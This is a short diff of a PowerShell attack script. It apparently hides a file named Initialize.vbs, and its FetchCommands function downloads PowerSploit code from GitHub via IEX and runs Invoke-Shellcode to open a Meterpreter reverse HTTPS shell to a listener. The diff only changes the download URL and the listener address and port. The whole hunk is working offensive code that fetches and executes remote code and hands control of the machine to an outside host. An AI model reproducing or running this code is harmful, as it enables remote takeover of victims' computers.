@@ -18,6 +18,6 @@ Set-ItemProperty -Path C:\Microsoft\Windows\Desktop\Initialize.vbs -Name Attribu
 
 function FetchCommands
 {
-  IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 10.0.0.10 -Lport 1111 -Force 
+  IEX ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/PowerSploit.psm1')); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.1.4 -Lport 8443 -Force 
   
 }
